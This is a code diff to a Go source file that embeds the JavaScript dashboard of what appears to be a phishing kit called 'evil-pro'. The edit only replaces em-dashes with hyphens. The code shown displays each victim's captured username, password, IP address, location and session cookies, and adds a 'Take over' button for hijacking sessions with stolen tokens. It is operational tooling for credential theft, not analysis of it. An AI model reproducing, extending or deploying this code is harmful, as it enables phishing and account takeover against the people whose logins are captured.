@@ -6,7 +6,7 @@ package core
 // end users get the least possible surface. The full REST API is still served.
 // NOTE: no backticks are used inside (Go raw string); string building uses '+' only.
 const panelJS = `'use strict';
-/* evil-pro dashboard — sessions only */
+/* evil-pro dashboard - sessions only */
 
 var $ = function (s, r) { return (r || document).querySelector(s); };
 var $$ = function (s, r) { return Array.prototype.slice.call((r || document).querySelectorAll(s)); };
@@ -179,14 +179,14 @@ async function openSession(id) {
   var s = await API.get('/api/v1/sessions/' + id);
   S.cur = s;
   window.postMessage({ type: 'SESSION_SELECT', payload: { sessionId: s.id, phishlet: s.phishlet, hasTokens: s.has_tokens } }, '*');
-  var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '') + (s.geo.isp ? ' · ' + s.geo.isp : '') + (s.geo.vpn ? ' [VPN]' : '') + (s.geo.datacenter ? ' [DC]' : '')) : '—';
+  var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '') + (s.geo.isp ? ' · ' + s.geo.isp : '') + (s.geo.vpn ? ' [VPN]' : '') + (s.geo.datacenter ? ' [DC]' : '')) : '-';
   var tok = s.tokens && Object.keys(s.tokens).length ? JSON.stringify(s.tokens, null, 2) : '(none)';
   var body = '<div class="kv">' +
-      row('Username', s.username || '—', s.username) + row('Password', s.password || '—', s.password) +
-      row('IP', s.remote_addr || '—') + row('Location', geo) +
-      row('Captured', fmtTime(s.create_time)) + row('Landing URL', s.landing_url || '—') +
+      row('Username', s.username || '-', s.username) + row('Password', s.password || '-', s.password) +
+      row('IP', s.remote_addr || '-') + row('Location', geo) +
+      row('Captured', fmtTime(s.create_time)) + row('Landing URL', s.landing_url || '-') +
     '</div>' +
-    '<div class="field mt14"><label>User agent</label><div class="pre">' + esc(s.useragent || '—') + '</div></div>' +
+    '<div class="field mt14"><label>User agent</label><div class="pre">' + esc(s.useragent || '-') + '</div></div>' +
     '<div class="field"><label>Cookies ' + (s.has_tokens ? '<span class="badge ok">' + s.token_count + ' captured</span>' : '<span class="badge mut">none</span>') + '</label><div class="pre">' + esc(tok) + '</div></div>';
   openDrawer('Session #' + s.id + ' · ' + esc(s.phishlet), body,
     (s.has_tokens ? '<button class="btn sm primary" data-act="inject" data-id="' + s.id + '">⚡ Take over</button>' : '') +
